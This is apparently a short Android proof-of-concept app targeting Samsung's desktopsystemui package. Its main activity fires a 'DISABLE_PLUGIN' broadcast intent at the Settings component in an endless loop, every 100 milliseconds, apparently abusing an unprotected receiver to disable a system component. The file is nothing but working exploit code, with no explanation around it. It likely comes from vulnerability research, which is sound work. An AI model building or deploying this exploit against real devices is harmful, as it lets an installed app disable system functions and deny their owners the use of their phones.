package poc.app;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        new Thread(() -> {
            try {
                ComponentName componentName = new ComponentName("com.android.settings", "com.android.settings.Settings");
                Uri uri = Uri.parse("package://" + componentName.flattenToString());

                Intent i = new Intent("com.samsung.desktopsystemui.action.DISABLE_PLUGIN", uri);
                i.setPackage("com.samsung.desktopsystemui");
                while (true) {
                    sendBroadcast(i);
                    Thread.sleep(100);
                }
            } catch (Throwable th) {
                throw new RuntimeException(th);
            }
        }).start();
    }
}